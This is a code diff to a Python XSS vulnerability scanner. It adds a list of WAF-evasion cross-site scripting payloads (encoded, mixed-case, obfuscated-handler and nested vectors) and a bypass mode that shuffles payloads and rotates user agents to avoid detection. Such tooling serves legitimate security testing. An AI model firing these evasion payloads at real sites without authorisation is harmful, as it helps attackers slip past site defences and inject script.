@@ -1,4 +1,5 @@
 import logging
+import random
 from urllib.parse import urlparse, parse_qs, quote
 from ..http_client import HttpClient
 import re
@@ -9,7 +10,9 @@ logger = logging.getLogger(__name__)
 class XSSScanner:
     def __init__(self, client=None):
         self.client = client if client else HttpClient()
-        self.payloads = [
+        
+        # Standard XSS payloads
+        self.standard_payloads = [
             "<script>alert('XSS')</script>",
             "<img src=x onerror=alert('XSS')>",
             "<svg onload=alert('XSS')>",
@@ -21,6 +24,33 @@ class XSSScanner:
             "<a href=javascript:alert('XSS')>XSS</a>",
             "<body onload=alert('XSS')>"
         ]
+        
+        # WAF evasion payloads
+        self.waf_evasion_payloads = [
+            # HTML entity encoding
+            "&#x3C;script&#x3E;alert('XSS')&#x3C;/script&#x3E;",
+            # JavaScript escaping
+            "\x3Cscript\x3Ealert('XSS')\x3C/script\x3E",
+            # Mixed case to bypass regex filters
+            "<ScRiPt>alert('XSS')</sCrIpT>",
+            # Splitting strings
+            "<img src=x onerror=\"al\u0065rt('XSS')\">\u0000",
+            # Nested vectors
+            "<iframe src=\"javascript:eval(`alert('XSS')`)\"></iframe>",
+            # DOM-based XSS
+            "<div id=\"test\" onmouseover=\"alert('XSS')\">Hover here</div>",
+            # Exotic vectors
+            "<svg><animate onbegin=alert('XSS') attributeName=x></animate></svg>",
+            # Obfuscated event handlers
+            "<img src=x on\x65rror=alert('XSS')>",
+            # Non-standard attributes
+            "<x oncopy=alert('XSS')>Copy this</x>",
+            # Unusual tags
+            "<math><mtext><table><mglyph><style><!--</style><img src=x onerror=alert('XSS')>--></mglyph></table></mtext></math>"
+        ]
+        
+        # Use standard payloads by default
+        self.payloads = self.standard_payloads
         self.encoding_patterns = [
             r'&lt;script&gt;',
             r'&lt;img',
@@ -34,8 +64,19 @@ class XSSScanner:
             r'&amp;lt;body'
         ]
 
-    def scan(self, url: str, forms: Optional[List[Dict]] = None) -> List[Dict]:
+    def scan(self, url: str, forms: Optional[List[Dict]] = None, waf_bypass: bool = False) -> List[Dict]:
         vulnerabilities = []
+        
+        # Enable WAF bypass mode if requested
+        if waf_bypass and isinstance(self.client, HttpClient):
+            self.client.enable_waf_bypass(True)
+            # Use WAF evasion payloads
+            self.payloads = self.standard_payloads + self.waf_evasion_payloads
+            # Randomize the order to avoid pattern detection
+            random.shuffle(self.payloads)
+        else:
+            # Use standard payloads
+            self.payloads = self.standard_payloads
         
         try:
             # Check URL parameters
@@ -46,8 +87,21 @@ class XSSScanner:
                 for param in params:
                     for payload in self.payloads:
                         try:
-                            test_url = self._inject_payload(url, param, payload)
-                            response = self.client.get(test_url, timeout=10)
+                            # Apply WAF bypass techniques to payload if enabled
+                            if waf_bypass and isinstance(self.client, HttpClient):
+                                bypass_payload = self.client.apply_payload_bypass(payload, 'xss')
+                            else:
+                                bypass_payload = payload
+                                
+                            test_url = self._inject_payload(url, param, bypass_payload)
+                            
+                            # Add random headers if WAF bypass is enabled
+                            if waf_bypass and isinstance(self.client, HttpClient):
+                                # Set a random user agent for each request
+                                self.client.set_random_user_agent()
+                                response = self.client.get(test_url, timeout=10)
+                            else:
+                                response = self.client.get(test_url, timeout=10)
                             
                             if response and self._is_vulnerable(response.text, payload):
                                 vulnerabilities.append({
@@ -80,11 +134,22 @@ class XSSScanner:
                         for field in form_fields:
                             for payload in self.payloads:
                                 try:
+                                    # Apply WAF bypass techniques to payload if enabled
+                                    if waf_bypass and isinstance(self.client, HttpClient):
+                                        bypass_payload = self.client.apply_payload_bypass(payload, 'xss')
+                                    else:
+                                        bypass_payload = payload
+                                        
                                     test_data = {}
                                     for f in form_fields:
                                         field_name = f.get('name') if isinstance(f, dict) else f
-                                        test_data[field_name] = payload if f == field else 'test'
+                                        test_data[field_name] = bypass_payload if f == field else 'test'
                                     
+                                    # Add random headers if WAF bypass is enabled
+                                    if waf_bypass and isinstance(self.client, HttpClient):
+                                        # Set a random user agent for each request
+                                        self.client.set_random_user_agent()
+                                        
                                     if method == 'POST':
                                         response = self.client.post(action, data=test_data, timeout=10)
                                     elif method == 'GET':
@@ -111,6 +176,10 @@ class XSSScanner:
         except Exception as e:
             logger.error(f"XSS scan error: {str(e)}")
         
+        # Disable WAF bypass mode after scan if it was enabled
+        if waf_bypass and isinstance(self.client, HttpClient):
+            self.client.enable_waf_bypass(False)
+            
         return vulnerabilities
 
     def _inject_payload(self, url: str, param: str, payload: str) -> str:
